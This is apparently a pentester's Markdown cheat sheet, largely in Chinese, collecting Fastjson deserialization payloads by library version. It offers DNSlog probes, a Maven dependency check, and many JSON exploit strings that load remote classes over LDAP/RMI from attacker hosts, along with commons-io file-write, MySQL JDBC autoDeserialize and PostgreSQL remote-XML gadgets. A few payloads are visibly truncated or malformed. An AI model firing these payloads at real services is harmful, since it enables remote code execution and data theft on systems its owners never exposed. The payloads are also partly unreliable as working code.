## Ref
- http://dream0x01.com/spear-framework/#/fastjson/fastjson
- https://github.com/welk1n/FastjsonPocs
- https://github.com/threedr3am/learnjavabug/blob/master/fastjson/src/main/java/com/threedr3am/bug/fastjson/rce
- [Fastjson 渗透测试指北](https://mp.weixin.qq.com/s/QGyb1Zv4F9IvmjKfiCD_4Q)
- [fastjson不出网利用、c3p0](https://github.com/depycode/fastjson-c3p0)
- [浅谈fastjson waf Bypass思路](https://www.sec-in.com/article/950)
- https://github.com/LeadroyaL/fastjson-blacklist
- [fastjson payload大集合](https://mp.weixin.qq.com/s/I0OdFPnRH_r1yZ04tOB-cw)
- https://github.com/su18/hack-fastjson-1.2.80

## fastjson黑盒检测
```json
{"@type":"java.net.Inet4Address","val":"dnslog"}
{"@type":"java.net.Inet6Address","val":"dnslog"}
```

## fastjson白盒检测
```
mvn dependency:tree -Dincludes=com.alibaba:fastjson -Dverbose
```
只有直接依赖，没有间接以来的结果示例：
```
[INFO] sec:java-sec-code:jar:1.0.0
[INFO] \- com.alibaba:fastjson:jar:1.2.60:compile
```
有间接依赖的示例：
```
[INFO] +- com.alibaba:fastjson:jar:1.2.24:compile
[INFO] +- com.aliyun.openservices:aliyun-log-producer:jar:0.3.3:compile
[INFO] |  \- com.aliyun.openservices:aliyun-log:jar:0.6.33:compile
[INFO] |     \- (com.alibaba:fastjson:jar:1.2.48:compile - version managed from 1.2.38; omitted for conflict with 1.2.24)
```
虽然这个例子由于pom中直接依赖了fastjson 1.2.24，导致`aliyun-log-producer`依赖的1.2.38版本失效。

参考：https://mvnrepository.com/artifact/com.aliyun.openservices/aliyun-log/0.6.63

如果注释掉最外部的直接依赖的fastjson 1.2.24，结果如下：
```
[INFO] +- com.t.c.m:m.c.p:jar:1.0.08:compile
[INFO] |  +- com.alibaba:fastjson:jar:1.2.48:compile
[INFO] |  \- com.t.t:t-c:jar:4.0.7:compile (version managed from 2.3.4.58)
[INFO] |     \- com.t.v:v-c:jar:4.7.4:compile (version managed from 4.6.2)
[INFO] |        \- (com.alibaba:fastjson:jar:1.2.48:compile - version managed from 1.1.41; omitted for duplicate)
```
最终项目用的fastjson版本是1.2.48.
使用这个命令可以查看简单结果：
```
mvn dependency:tree -Dincludes=com.alibaba:fastjson
```

## poc for all versions

### <= 1.2.68 org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig
pom.xml:
```xml
        <dependency>
            <groupId>org.apache.hadoop</groupId>
            <artifactId>hadoop-client-minicluster</artifactId>
            <version>3.2.1</version>
        </dependency>
```

poc:
```json
{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://localhost:43658/Calc"}
{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://localhost:43658/Calc"}
```

### <= 1.2.66 org.apache.shiro.realm.jndi.JndiRealmFactory
pom.xml:
```xml
        <!-- https://mvnrepository.com/artifact/org.apache.shiro/shiro-core -->
        <dependency>
            <groupId>org.apache.shiro</groupId>
            <artifactId>shiro-core</artifactId>
            <version>1.2.4</version>
        </dependency>
```

poc:
```json
{"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", "jndiNames":["ldap://shiro.5a8a62c8cc78196e6377.d.zhack.ca:43658/Calc"], "Realms":[""]}
```


### <= 1.2.62 org.apache.xbean.propertyeditor.JndiConverter
pom.xml:
```xml
        <!-- https://mvnrepository.com/artifact/org.apache.xbean/xbean-reflect -->
        <dependency>
            <groupId>org.apache.xbean</groupId>
            <artifactId>xbean-reflect</artifactId>
            <version>4.16</version>
        </dependency>
```

poc:
```json
{"@type":"org.apache.xbean.propertyeditor.JndiConverter","asText":"ldap://localhost:1389/Calc"}
```


### <= 1.2.62 com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig
pom.xml:
```xml
<dependency>
    <groupId>org.apache.ibatis</groupId>
    <artifactId>ibatis-sqlmap</artifactId>
    <version>2.3.4.726</version>
</dependency>
```

poc:
```json
{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://192.168.85.1:1389/calc"}}
```

### <= 1.2.62 org.apache.cocoon.components.slide.impl.JMSContentInterceptor
pom.xml:
```xml
        <dependency>
            <groupId>slide</groupId>
            <artifactId>slide-kernel</artifactId>
            <version>2.1</version>
        </dependency>
        <dependency>
            <groupId>cocoon</groupId>
            <artifactId>cocoon-slide</artifactId>
            <version>2.1.11</version>
        </dependency>
```

poc:
```json
{"@type":"org.apache.cocoon.components.slide.impl.JMSContentInterceptor", "parameters": {"@type":"java.util.Hashtable","java.naming.factory.initial":"com.sun.jndi.rmi.registry.RegistryContextFactory","topic-factory":"ldap://192.168.85.1:1389/calc"}, "namespace":""}
```
in which `"java.naming.factory.initial":"com.sun.jndi.rmi.registry.RegistryContextFactory",` is essential.


### <=1.2.62 br.com.anteros.dbcp.AnterosDBCPConfig
pom.xml
```
        <dependency>
            <groupId>com.codahale.metrics</groupId>
            <artifactId>metrics-healthchecks</artifactId>
            <version>3.0.2</version>
        </dependency>
        <dependency>
            <groupId>br.com.anteros</groupId>
            <artifactId>Anteros-Core</artifactId>
            <version>1.2.1</version>
        </dependency>
        <dependency>
            <groupId>br.com.anteros</groupId>
            <artifactId>Anteros-DBCP</artifactId>
            <version>1.0.1</version>
        </dependency>
```

poc:
```json
{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry":"ldap://192.168.85.1:1389/Calc"}
```


### <=1.2.59 org.apache.commons.proxy.provider.remoting.SessionBeanProvider
pom.xml:
```xml
        <dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-proxy</artifactId>
            <version>1.0</version>
        </dependency>
```
poc:
```json
{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"ldap://192.168.85.1:1389/Calc","Object":"a"}
{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"ldap://192.168.85.1:1389/Calc"}
```

### <=1.2.59 com.zaxxer.hikari.HikariConfig
pom.xml:
```xml
        <!-- https://mvnrepository.com/artifact/hikari-cp/hikari-cp -->
        <dependency>
          <groupId>com.zaxxer</groupId>
          <artifactId>HikariCP</artifactId>
          <version>3.4.1</version>
        </dependency>
```

poc:
```json
{"@type":"com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://192.168.85.1:1389/Calc"}
{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://192.168.85.1:1389/Calc"}
```



### MISC(to be checked)
#### 1.2.24
```json
{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit", "autoCommit":true}}
```

#### 未知版本(1.2.24-41之间)
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}
```

#### 1.2.41
```json
{"@type":"Lcom.sun.rowset.RowSetImpl;","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}
```

#### 1.2.42
```json
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true};
```

#### 1.2.43
```json
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true]}
```

#### 1.2.45
```json
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://localhost:1099/Exploit"}}
```

#### 1.2.47
```json
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}}}
```


#### 1.2.68 commons-io的随缘的文件写入：
依赖2.6或者2.4？
```xml
        <dependency>
            <groupId>commons-io</groupId>
            <artifactId>commons-io</artifactId>
            <version>2.6</version>
        </dependency>
```

payload:
```json
{"cqq":{"@type":"java.util.Currency","val":{"currency":{"writer":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.output.FileWriterWithEncoding","file":"/Users/xxx/GitProjects/demo/output.txt","encoding":"UTF-8"},"outputStream":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.output.WriterOutputStream","writeImmediately":true,"bufferSize":4,"charsetName":"UTF-8","writer":{"$ref":"$.currency.writer"}},"charInputStream":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.CharSequenceInputStream","charset":"UTF-8","bufferSize":4,"s":{"@type":"java.lang.String""test by cqq!

```

#### 1.2.68 jdbc反序列化
```json
{"@type":"java.lang.AutoCloseable", "@type":"com.mysql.jdbc.JDBC4Connection","hostToConnectTo":"172.20.64.40","portToConnectTo":3306,"url":"jdbc:mysql://172.20.64.40:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","databaseToConnectTo":"test","info":{"@type":"java.util.Properties","PORT":"3306","statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true","user":"yso_URLDNS_http://ahfladhjfd.6fehoy.dnslog.cn","PORT.1":"3306","HOST.1":"172.20.64.40","NUM_HOSTS":"1","HOST":"172.20.64.40","DBNAME":"test"}}
```

Mysqlconnector 5.1.x
```

{"@type":"java.lang.AutoCloseable","@type":"com.mysql.jdbc.JDBC4Connection","hostToConnectTo":"mysql.host","portToConnectTo":3306,"info":{"user":”user","password":"pass","statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true","NUM_HOSTS": "1"},"databaseToConnectTo":"dbname","url":""}
```

Mysqlconnector 6.0.2 or 6.0.3
```
{"@type": "java.lang.AutoCloseable","@type": "com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection","proxy":{"connectionString":{"url": "jdbc:mysql://localhost:3306/foo?allowLoadLocalInfile=true"}}}
```

Mysqlconnector 6.x or < 8.0.20
```
{"@type":"java.lang.AutoCloseable","@type":"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection","proxy":{"@type":"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy","connectionUrl":{"@type":"com.mysql.cj.conf.url.ReplicationConnectionUrl", "masters": [{"host":"mysql.host"}], "slaves":[], "properties":{"host":"mysql.host","user":"user","dbname":"dbname","password":"pass","queryInterceptors":"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true"}}}}
```

8.0.23:
```
{"@type":"java.lang.AutoCloseable","@type":"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection","proxy":{"@type":"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy","connectionUrl":{"@type":"com.mysql.cj.conf.url.ReplicationConnectionUrl", "sources": [{"host":""}], "replicas":[], "properties":{"host":"104.x.y.z",
"port":"33060","user":"user","dbname":"dbname","password":"pass","queryInterceptors":"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true",
"allowLoadLocalInfile":"true"}}}}
```

#### pgsql
```json

{
    "@type": "java.lang.AutoCloseable",
    "@type": "org.postgresql.jdbc.PgConnection",
    "hostSpecs": [{
        "host": "127.0.0.1",
        "port": 2333
    }],
    "user": "test",
    "database": "test",
    "info": {
        "socketFactory": "org.springframework.context.support.ClassPathXmlApplicationContext",
        "socketFactoryArg": "http://127.0.0.1:81/test.xml"
    },
    "url": ""
}

```

参考：
- https://github.com/su18/fastjson-commons-io
- [Fastjson 68 commons-io AutoCloseable](https://su18.org/post/fastjson-1.2.68/)
- https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf
- https://su18.org/post/fastjson/#8-fastjson-1268
- https://github.com/safe6Sec/Fastjson
- https://f5.pm/go-82366.html
- [fastjson 读文件 gadget 的利用场景扩展](https://b1ue.cn/archives/506.html)
- https://mp.weixin.qq.com/s/0yyZH_Axa0UTr8kquSixwQ
- https://mp.weixin.qq.com/s/SwkJVTW3SddgA6uy_e59qg
- https://github.com/kezibei/fastjson_payload
- https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg
- https://mp.weixin.qq.com/s/wdOb5ESfbkMSfdDlRvOg-g
- https://github.com/Whoopsunix/fastjson_study/blob/master/recurring.md
